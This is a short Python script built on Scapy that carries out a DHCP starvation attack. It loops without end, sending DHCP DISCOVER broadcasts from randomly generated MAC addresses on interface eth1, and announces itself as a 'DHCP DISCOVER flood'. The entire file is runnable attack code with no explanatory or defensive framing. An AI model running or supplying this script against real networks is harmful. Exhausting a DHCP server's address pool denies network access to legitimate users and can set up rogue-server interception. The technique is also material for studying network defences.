from scapy.all import *
import random
import time

iface = "eth1"

def random_mac():
    return "02:%02x:%02x:%02x:%02x:%02x" % tuple(
        random.randint(0, 255) for _ in range(5)
    )

print("[*] DHCP DISCOVER flood started")

while True:
    mac = random_mac()

    pkt = (
        Ether(src=mac, dst="ff:ff:ff:ff:ff:ff") /
        IP(src="0.0.0.0", dst="255.255.255.255") /
        UDP(sport=68, dport=67) /
        BOOTP(chaddr=bytes.fromhex(mac.replace(":", "")) + b"\x00" * 10) /
        DHCP(options=[("message-type", "discover"), "end"])
    )

    sendp(pkt, iface=iface, verbose=False)
    time.sleep(0.01)
